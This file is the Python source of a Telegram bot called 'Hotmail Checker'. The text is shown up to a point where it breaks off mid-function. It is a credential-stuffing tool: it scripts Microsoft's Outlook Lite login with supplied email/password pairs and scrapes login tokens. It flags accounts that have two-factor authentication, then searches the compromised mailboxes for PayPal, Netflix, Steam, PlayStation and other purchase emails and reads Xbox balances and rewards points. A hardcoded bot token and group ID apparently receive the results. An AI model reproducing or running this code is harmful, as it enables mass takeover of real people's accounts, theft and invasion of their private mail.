#!/usr/bin/env python3
# ================================================================
#  Hotmail Checker — Telegram Bot
#  Token  : 8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8
#  Group  : -1002893702017
# ================================================================

# ─── Auto Install ───────────────────────────────────────────────
import sys, subprocess
_PKGS = ['requests', 'user_agent']
def _install(pkg):
    try:
        __import__(pkg)
    except ImportError:
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', pkg])
for _p in _PKGS:
    _install(_p)

# ─── Imports ────────────────────────────────────────────────────
import os, re, json, uuid, time, queue, threading, tempfile
from datetime import datetime
from pathlib import Path
import requests
import user_agent

# ─── Bot Config ─────────────────────────────────────────────────
BOT_TOKEN   = "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8"
GROUP_ID    = "-1002893702017"
API_BASE    = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ─── Currency helpers ───────────────────────────────────────────
CURRENCY_SYMBOLS = {
    "USD":"$","EUR":"€","GBP":"£","JPY":"¥","RUB":"₽","TRY":"₺",
    "AED":"د.إ","SAR":"﷼","KWD":"د.ك","EGP":"£","PKR":"₨","INR":"₹",
    "KRW":"₩","BRL":"R$","ARS":"$","MXN":"$","CAD":"$","AUD":"$",
}
AMBIGUOUS = {"USD","CAD","AUD","MXN","ARS","HKD","SGD"}

def format_currency(amount, code=None):
    try:
        s = str(amount).strip()
        if code:
            code = code.upper().strip()
        sym = CURRENCY_SYMBOLS.get(code or "", "")
        if sym:
            return f"{sym}{s} {code}" if code in AMBIGUOUS else f"{sym}{s}"
        return f"{s} {code}" if code else s
    except:
        return str(amount)

def format_number(n):
    try:
        n = int(n)
        if n >= 1_000_000: return f"{n/1_000_000:.1f}M"
        if n >= 1_000:     return f"{n/1_000:.1f}K"
        return str(n)
    except: return str(n)

def get_flag(cc):
    try:
        cc = cc.strip().upper()[:2]
        return chr(0x1F1E6+ord(cc[0])-65)+chr(0x1F1E6+ord(cc[1])-65)
    except: return ""

def get_remaining_days(date_str):
    try:
        d = datetime.fromisoformat(date_str.replace('Z','+00:00'))
        return str((d - datetime.now(d.tzinfo)).days)
    except: return "0"

# ─── Hits Services ──────────────────────────────────────────────
HITS_SERVICES = {
    'netflix': {
        'type': 'search',
        'keywords': ['profile','plan','Next billing','info@account.netflix.com'],
    },
    'facebook': {
        'type': 'search',
        'keywords': ['advertise-noreply@support.facebook.com','facebook.com','facebook'],
    },
    'dazn': {
        'type': 'search',
        'keywords': [
            'DAZN Baloncesto Instalment ES','price','plan',
            'DAZN Ligue1+ Monthly FR','NFL Instalments Ultimate Season Pass PA',
            'PAC DAZN Full Monthly IT','DAZN Full Instalments IT',
            'PAC DAZN Gold Monthly AT','3PP DAZN Full Monthly IT',
            'PAC DAZN Movistar Gold Monthly ES','DAZN Monthly SE',
            'DAZN Full Annual IT','DAZN Full Monthly IT',
            'DAZN and Ligue1+ Instalments FR','DAZN Family Annual IT',
            'PAC DAZN MyClubPass Instalments IT','LEGACY DAZN Silver Instalments IT',
        ],
    },
    'psn': {
        'type': 'config',
        'queries': ['Playstation Sony','playstation.com','reply@txn-email.playstation.com'],
        'count_senders': [
            'sony@txn-email.playstation.com',
            'Sony@email.sonyentertainmentnetwork.com',
            'sony@txn-email01.playstation.com',
            'sony@txn-email02.playstation.com',
            'sony@txn-email03.playstation.com',
        ],
        'purchase_kw': ['PlayStation\u00aeStore','PlayStation\u2122Store'],
        'order_kw': 'Thank You For Your Purchase',
    },
    'roblox': {
        'type': 'config',
        'queries': ['no-reply@roblox.com'],
        'count_senders': [], 'purchase_kw': [], 'order_kw': '',
        'extra': 'roblox',
    },
    'paypal': {
        'type': 'config',
        'queries': ['service@intl.paypal.com'],
        'count_senders': [], 'purchase_kw': [],
        'order_kw': ' a Social Online Payments',
    },
    'epicgames': {
        'type': 'config',
        'queries': [
            'epicgames.com',
            'sony@email.sonyentertainmentnetwork.com',
            'sony@txn-email03.playstation.com',
        ],
        'count_senders': [], 'purchase_kw': [], 'order_kw': '',
    },
}

# ═══════════════════════════════════════════════════════════════
#  UnifiedChecker  (core engine — no GUI, no Chrome, no tdata)
# ═══════════════════════════════════════════════════════════════
class UnifiedChecker:

    DEFAULT_SERVICES = {
        "account@steampowered.com":          "Steam",
        "no-reply@steampowered.com":         "Steam",
        "noreply@roblox.com":                "Roblox",
        "no-reply@roblox.com":               "Roblox",
        "info@minecraft.net":                "Minecraft",
        "no-reply@minecraft.net":            "Minecraft",
        "noreply@epicgames.com":             "Epic Games",
        "service@paypal.com":                "PayPal",
        "service@intl.paypal.com":           "PayPal",
        "netflix.com":                       "Netflix",
        "info@account.netflix.com":          "Netflix",
        "noreply@spotify.com":               "Spotify",
        "no-reply@spotify.com":              "Spotify",
        "cs@amazonpayments.com":             "Amazon",
        "auto-confirm@amazon.com":           "Amazon",
        "do-not-reply@amazon.com":           "Amazon",
        "shipment-tracking@amazon.com":      "Amazon",
        "noreply@twitch.tv":                 "Twitch",
        "no-reply@amazon.com":               "Amazon",
        "account-update@amazon.com":         "Amazon",
        "digital-no-reply@amazon.com":       "Amazon",
        "payments-messages@amazon.com":      "Amazon",
        "noreply@uber.com":                  "Uber",
        "noreply@ubereats.com":              "UberEats",
        "no-reply@uber.com":                 "Uber",
        "support@discord.com":               "Discord",
        "noreply@discord.com":               "Discord",
        "help@twitter.com":                  "Twitter",
        "noreply@twitter.com":               "Twitter",
        "no-reply@twitter.com":              "Twitter",
        "info@twitter.com":                  "Twitter",
        "noreply@instagram.com":             "Instagram",
        "no-reply@instagram.com":            "Instagram",
        "security@instagram.com":            "Instagram",
        "mail@facebookmail.com":             "Facebook",
        "notification@facebookmail.com":     "Facebook",
        "noreply@tiktok.com":                "TikTok",
        "no-reply@tiktok.com":               "TikTok",
        "noreply@snapchat.com":              "Snapchat",
        "no-reply@snapchat.com":             "Snapchat",
        "noreply@youtube.com":               "YouTube",
        "noreply@google.com":                "Google",
        "no-reply@google.com":               "Google",
        "noreply@apple.com":                 "Apple",
        "no_reply@email.apple.com":          "Apple",
        "do_not_reply@apple.com":            "Apple",
        "noreply@microsoft.com":             "Microsoft",
        "no-reply@microsoft.com":            "Microsoft",
        "msa@communication.microsoft.com":   "Microsoft",
        "security@communication.microsoft.com":"Microsoft",
        "riot@riotgames.com":                "Riot Games",
        "noreply@riotgames.com":             "Riot Games",
        "support@riotgames.com":             "Riot Games",
        "noreply@supercell.com":             "Supercell",
        "no-reply@supercell.com":            "Supercell",
        "noreply@ea.com":                    "EA",
        "no-reply@ea.com":                   "EA",
        "do-not-reply@ea.com":               "EA",
        "noreply@ubisoft.com":               "Ubisoft",
        "no-reply@ubisoft.com":              "Ubisoft",
        "noreply@blizzard.com":              "Blizzard",
        "no-reply@blizzard.com":             "Blizzard",
        "noreply@battle.net":                "Battle.net",
        "noreply@bethesda.net":              "Bethesda",
        "noreply@2k.com":                    "2K Games",
        "noreply@activision.com":            "Activision",
        "noreply@rockstargames.com":         "Rockstar",
        "noreply@nintendo.com":              "Nintendo",
        "noreply@sega.com":                  "SEGA",
        "noreply@namco.com":                 "Namco",
        "noreply@konami.com":                "Konami",
        "noreply@capcom.com":                "Capcom",
    }

    def __init__(self, proxy=None):
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=5, pool_maxsize=10, max_retries=0)
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.uuid = str(uuid.uuid4())

    def log(self, msg):
        pass  # silent in bot mode

    # ── IDP Check ───────────────────────────────────────────────
    def _idp_check(self, email):
        try:
            r = self.session.get(
                f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
                headers={
                    "X-OneAuth-AppName": "Outlook Lite",
                    "X-Office-Version": "3.11.0-minApi24",
                    "X-CorrelationId": self.uuid,
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                    "Host": "odc.officeapps.live.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip"
                }, timeout=15)
            return r.text
        except:
            return ""

    # ── Profile Parse ────────────────────────────────────────────
    def parse_country_from_json(self, profile):
        for key in ['location', 'country', 'countryLetterCode', 'usageLocation']:
            v = profile.get(key)
            if v and isinstance(v, str) and len(v) >= 2:
                return v.strip().upper()[:2]
        return ""

    def parse_name_from_json(self, profile):
        for key in ['displayName', 'givenName', 'surname', 'name']:
            v = profile.get(key)
            if v and isinstance(v, str) and v.strip():
                return v.strip()
        return ""

    # ── Microsoft Subscriptions ──────────────────────────────────
    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        result = {
            "xbox": {"status": "N/A"},
            "balance": None, "balance_amount": None, "balance_currency": None,
            "rewards_points": None,
            "hypixel_status": "NOT_FOUND", "hypixel_level": None,
            "hypixel_bw_stars": None, "hypixel_sb_coins": None,
            "hypixel_first_login": None, "hypixel_last_login": None,
            "hypixel_banned": None,
        }
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Accept": "application/json",
            }
            # Xbox / Game Pass
            try:
                r = self.session.get(
                    "https://xsts.auth.xboxlive.com/xsts/authorize",
                    headers=h, timeout=10)
            except: pass

            # Balance
            try:
                r = self.session.get(
                    "https://api.billing.microsoft.com/v1.0/billing/balances",
                    headers=h, timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    balances = d.get('value', [])
                    if balances:
                        b = balances[0]
                        result['balance_amount']   = b.get('balance', '')
                        result['balance_currency'] = b.get('currencyCode', '')
                        result['balance'] = format_currency(
                            b.get('balance',''), b.get('currencyCode',''))
            except: pass

            # Rewards
            try:
                r = self.session.get(
                    "https://prod.rewardsplatform.microsoft.com/api/v1.0/users/me/summary",
                    headers=h, timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    pts = (d.get('data', {}) or {}).get('availablePoints',
                          d.get('availablePoints', None))
                    if pts is not None:
                        result['rewards_points'] = pts
            except: pass

            # Xbox subscription
            try:
                r = self.session.get(
                    "https://xblmesa.xboxlive.com/v1/users/me/headless/subscriptions",
                    headers={**h, "x-xbl-contract-version": "1"}, timeout=10)
                if r.status_code == 200:
                    subs = r.json().get('Items', [])
                    if subs:
                        s = subs[0]
                        name = s.get('productName', s.get('Name', ''))
                        days = s.get('daysUntilRenewal',
                               get_remaining_days(s.get('nextBillingDate', '')))
                        result['xbox'] = {
                            'status': 'PREMIUM',
                            'details': f"{name} | {days}d"
                        }
            except: pass

        except Exception as e:
            self.log(f"MS subs error: {e}")
        return result

    # ── PSN ─────────────────────────────────────────────────────
    @staticmethod
    def extract_online_ids(text):
        if isinstance(text, (dict, list)):
            text = json.dumps(text)
        ids = []
        patterns = [
            r'(?i)(?:Hello|Hi|Welcome back)[,\s]+([a-zA-Z0-9_-]{3,20})',
            r'(?i)(?:psn[-_]?id|online[-_]?id)[:\s]+([a-zA-Z0-9_-]{3,20})',
            r'(?i)username[:\s]+([a-zA-Z0-9_-]{3,20})',
        ]
        for pat in patterns:
            for m in re.findall(pat, text):
                m = m.strip()
                if (3 <= len(m) <= 20
                        and m not in ids
                        and not re.match(r'^\d+$', m)
                        and 'null' not in m.lower()):
                    ids.append(m)
        return ids[:5]

    def check_psn(self, email, access_token, cid):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "SentItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": (
                        "sony@txn-email.playstation.com OR "
                        "Sony@email.sonyentertainmentnetwork.com OR "
                        "sony@txn-email01.playstation.com OR "
                        "sony@txn-email02.playstation.com OR "
                        "sony@txn-email03.playstation.com"
                    )},
                    "RefiningQueries": None,
                    "Size": 50,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time",  "SortDirection": "Desc"},
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 5,
                }],
                "LogicalId": str(uuid.uuid4()),
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=h, timeout=15)
            if r.status_code != 200:
                return {"psn_status": "FREE", "psn_emails_count": 0,
                        "psn_orders": 0, "psn_online_ids": [], "psn_purchases": []}

            data = r.json()
            raw  = r.text
            cnt  = 0
            previews = []
            for es in data.get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    cnt = rs.get('Total', 0)
                    for res in rs.get('Results', []):
                        p = res.get('Preview', '')
                        if p:
                            previews.append(str(p))
                    break

            preview_text = "\n".join(previews) if previews else raw
            online_ids   = self.extract_online_ids(preview_text)
            lower        = preview_text.lower()
            orders       = sum(lower.count(k) for k in
                               ['order','purchase','receipt','invoice','transaction'])

            if cnt > 0:
                return {"psn_status": "HAS_ORDERS", "psn_emails_count": cnt,
                        "psn_orders": orders, "psn_online_ids": online_ids,
                        "psn_purchases": []}
            return {"psn_status": "FREE", "psn_emails_count": 0,
                    "psn_orders": 0, "psn_online_ids": [], "psn_purchases": []}
        except Exception as e:
            return {"psn_status": "ERROR", "psn_emails_count": 0,
                    "psn_orders": 0, "psn_online_ids": [], "psn_purchases": []}

    # ── Steam ────────────────────────────────────────────────────
    def check_steam(self, email, access_token, cid):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Accept": "application/json",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@steampowered.com OR no-reply@steampowered.com"},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [{"Field": "Score","SortDirection":"Desc","Count":3},
                             {"Field": "Time","SortDirection":"Desc"}],
                    "EnableTopResults": True, "TopResultsCount": 3,
                }],
                "LogicalId": str(uuid.uuid4()),
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=h, timeout=15)
            if r.status_code != 200:
                return {"steam_status": "FREE", "steam_count": 0, "steam_purchases": []}
            data = r.json()
            cnt = 0
            for es in data.get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    cnt = rs.get('Total', 0)
                    break
            if cnt > 0:
                return {"steam_status": "HAS_PURCHASES", "steam_count": cnt, "steam_purchases": []}
            return {"steam_status": "FREE", "steam_count": 0, "steam_purchases": []}
        except:
            return {"steam_status": "ERROR", "steam_count": 0, "steam_purchases": []}

    # ── Supercell ────────────────────────────────────────────────
    def check_supercell(self, email, access_token, cid):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Accept": "application/json",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@supercell.com OR no-reply@supercell.com"},
                    "RefiningQueries": None,
                    "Size": 25,
                    "Sort": [{"Field":"Score","SortDirection":"Desc","Count":3},
                             {"Field":"Time","SortDirection":"Desc"}],
                    "EnableTopResults": True, "TopResultsCount": 3,
                }],
                "LogicalId": str(uuid.uuid4()),
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=h, timeout=15)
            if r.status_code != 200:
                return {"supercell_status": "FREE", "supercell_games": []}
            data = r.json()
            raw  = r.text
            cnt  = 0
            for es in data.get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    cnt = rs.get('Total', 0); break
            if cnt > 0:
                games = []
                for g in ['ClashOfClans','ClashRoyale','BrawlStars','HayDay',
                          'BoomBeach','ClashQuest','SquadBusters']:
                    if g.lower() in raw.lower():
                        games.append(g)
                return {"supercell_status": "LINKED",
                        "supercell_games": games or ["Supercell Game"]}
            return {"supercell_status": "FREE", "supercell_games": []}
        except:
            return {"supercell_status": "ERROR", "supercell_games": []}

    # ── TikTok ───────────────────────────────────────────────────
    def check_tiktok(self, email, access_token, cid):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Accept": "application/json",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@tiktok.com OR no-reply@tiktok.com"},
                    "RefiningQueries": None,
                    "Size": 10,
                    "Sort": [{"Field":"Score","SortDirection":"Desc","Count":3},
                             {"Field":"Time","SortDirection":"Desc"}],
                    "EnableTopResults": True, "TopResultsCount": 3,
                }],
                "LogicalId": str(uuid.uuid4()),
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query",
                json=payload, headers=h, timeout=15)
            if r.status_code != 200:
                return {"tiktok_status": "FREE", "tiktok_username": "",
                        "tiktok_followers": 0, "tiktok_following": 0,
                        "tiktok_videos": 0, "tiktok_likes": 0}
            data = r.json()
            cnt  = 0
            raw  = r.text
            for es in data.get('EntitySets',[]):
                for rs in es.get('ResultSets',[]):
                    cnt = rs.get('Total', 0); break
            if cnt > 0:
                # Try to find username from email body
                uname_m = re.search(r'@([a-zA-Z0-9_.]{2,30})', raw)
                uname = uname_m.group(1) if uname_m else ""
                return {"tiktok_status": "LINKED", "tiktok_username": uname,
                        "tiktok_emails": cnt,
                        "tiktok_followers": 0, "tiktok_following": 0,
                        "tiktok_videos": 0, "tiktok_likes": 0}
            return {"tiktok_status": "FREE", "tiktok_username": "",
                    "tiktok_followers": 0, "tiktok_following": 0,
                    "tiktok_videos": 0, "tiktok_likes": 0}
        except:
            return {"tiktok_status": "ERROR", "tiktok_username": "",
                    "tiktok_followers": 0, "tiktok_following": 0,
                    "tiktok_videos": 0, "tiktok_likes": 0}

    # ── Minecraft ────────────────────────────────────────────────
    def check_minecraft(self, email, access_token, cid):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Accept": "application/json",
            }
            # Check via Microsoft Store / Xbox
            r = self.session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
            if r.status_code == 200:
                d = r.json()
                uname = d.get('name', '')
                uid   = d.get('id', '')
                capes = [c.get('alias','') for c in d.get('capes', [])]
                return {"minecraft_status": "OWNED",
                        "minecraft_username": uname,
                        "minecraft_uuid": uid,
                        "minecraft_capes": capes}
            return {"minecraft_status": "FREE", "minecraft_username": "",
                    "minecraft_uuid": "", "minecraft_capes": []}
        except:
            return {"minecraft_status": "FREE", "minecraft_username": "",
                    "minecraft_uuid": "", "minecraft_capes": []}

    # ── Regular Services (inbox scan) ────────────────────────────
    def check_regular_services(self, access_token, cid, email):
        try:
            h = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": str(uuid.uuid4()),
                "x-req-source": "Mini",
                "authorization": f"Bearer {access_token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
                "action": "StartupData",
                "x-owa-correlationid": str(uuid.uuid4()),
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9",
            }
            inbox_text = ""
            try:
                r = self.session.post(
                    f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                    data="", headers=h, timeout=30)
                inbox_text = r.text.lower()
            except: pass

            found = {}
            for svc_email, svc_name in self.DEFAULT_SERVICES.items():
                e_low = svc_email.lower()
                found[svc_name] = any(p in inbox_text for p in [
                    e_low, e_low.replace('@',' '),
                    e_low.replace('.',' '), svc_name.lower()
                ])
            return found
        except:
            return {}

    # ── Substrate Search (shared) ────────────────────────────────
    def _hs_search(self, access_token, cid, query, size=25):
        try:
            h = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json",
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "RefiningQueries": None,
                    "Size": size,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time",  "SortDirection": "Desc"},
                    ],
                    "EnableTopResults": True, "TopResultsCount": 3,
                }],
                "AnswerEntityRequests": [{
                    "Query": {"QueryString": query},
                    "EntityTypes": ["Event", "File"],
                    "From": 0, "Size": 100,
                    "EnableAsyncResolution": True,
                }],
                "QueryAlterationOptions": {
                    "EnableSuggestion": True, "EnableAlteration": True,
                    "SupportedRecourseDisplayTypes": [
                        "Suggestion","NoResultModification",
                        "NoResultFolderRefinerModification",
                        "NoRequeryModification","Modification"
                    ],
                },
                "LogicalId": str(uuid.uuid4()),
            }
            r = self.session.post(
                "https://outlook.live.com/search/api/v2/query"
                "?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                json=payload, headers=h, timeout=20)
            if r.status_code != 200:
                return None, ""
            return r.json(), r.text
        except Exception as e:
            return None, ""

    @staticmethod
    def _get_total(data):
        try:
            return int(data["EntitySets"][0]["Total"] or 0)
        except: pass
        try:
            return int(data["ResultSets"][0]["Total"] or 0)
        except: pass
        return 0

    @staticmethod
    def _get_last_msg(data):
        subject, date = "", ""
        try:
            src = data["EntitySets"][0]["ResultSets"][0]["Results"][0].get("Source", {})
            subject = src.get("NormalizedSubject", "")
            for dk in ("ReceivedOrRenewTime","LastDeliveryTime","ReceivedTime"):
                v = src.get(dk, "")
                if v:
                    date = v.split("T")[0]; break
        except: pass
        return subject, date

    # ── Custom Services ──────────────────────────────────────────
    def check_custom_services(self, access_token, cid):
        results = {}
        for svc, cfg in HITS_SERVICES.items():
            try:
                if cfg["type"] == "search":
                    found_kw = []
                    for kw in cfg.get("keywords", []):
                        data, _ = self._hs_search(access_token, cid, kw, size=1)
                        if data and self._get_total(data) > 0:
                            found_kw.append(kw)
                    results[svc] = {
                        "status":         "FOUND" if found_kw else "NOT_FOUND",
                        "found_keywords": found_kw,
                        "found_count":    len(found_kw),
                        "vip":            len(found_kw) >= 2,
                    }
                elif cfg["type"] == "config":
                    total, per_query, raw_all = 0, {}, ""
                    last_subj, last_date = "", ""
                    for q in cfg.get("queries", []):
                        data, raw = self._hs_search(access_token, cid, q, size=25)
                        if not data:
                            per_query[q] = 0; continue
                        t = self._get_total(data)
                        per_query[q] = t; total += t; raw_all += raw
                        if not last_subj:
                            last_subj, last_date = self._get_last_msg(data)
                    sender_counts = {}
                    for s in cfg.get("count_senders", []):
                        n = raw_all.lower().count(s.lower())
                        if n: sender_counts[s] = n
                    purchase_count = sum(raw_all.count(pk)
                                        for pk in cfg.get("purchase_kw", []))
                    ok = cfg.get("order_kw", "")
                    order_count = raw_all.count(ok) if ok else 0
                    if svc == "psn" and sender_counts:
                        total = max(total, sum(sender_counts.values()))
                    results[svc] = {
                        "status":        "FOUND" if total > 0 else "NOT_FOUND",
                        "total":         total,
                        "per_query":     per_query,
                        "sender_counts": sender_counts,
                        "purchases":     purchase_count,
                        "orders":        order_count,
                        "last_subject":  last_subj,
                        "last_date":     last_date,
                        "vip":           False,
                    }
            except Exception as e:
                results[svc] = {"status": "ERROR", "vip": False}
        return results

    # ── Main Check ───────────────────────────────────────────────
    def check(self, email, password):
        try:
            idp_text = self._idp_check(email)
            if any(k in idp_text for k in ["Neither","Both","Placeholder","OrgId"]):
                return {"status": "BAD"}
            if "MSAccount" not in idp_text:
                return {"status": "BAD"}

            import urllib.parse
            time.sleep(0.3)
            url2 = (
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_info=1&haschrome=1"
                f"&login_hint={email}&mkt=en&response_type=code"
                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&scope=profile%20openid%20offline_access"
                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            )
            r2 = self.session.get(url2, headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
            }, allow_redirects=True, timeout=15)

            url_match  = re.search(r'urlPost\":\"([^\"]+)\"', r2.text)
            ppft_match = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"([^\"]+)\"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft     = ppft_match.group(1)

            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                "&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
                f"&passwd={urllib.parse.quote(password)}&ps=2"
                "&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
                "&canary=&ctx=&hpgrequestid="
                f"&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs="
                "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
                "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            )
            r3 = self.session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url,
            }, allow_redirects=False, timeout=10)

            resp_low = r3.text.lower()
            if "account or password is incorrect" in resp_low or r3.text.count("error") > 0:
                return {"status": "BAD"}
            if "identity/confirm" in r3.text or "Consent" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            if "Abuse" in r3.text:
                return {"status": "BAD"}

            location   = r3.headers.get("Location", "")
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            code = code_match.group(1)

            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}
            cid = mspcid.upper()

            token_data = (
                "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
                "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                "&scope=profile%20openid%20offline_access"
                "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            r4 = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10)
            if "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json   = r4.json()
            access_token = token_json["access_token"]

            profile_headers = {
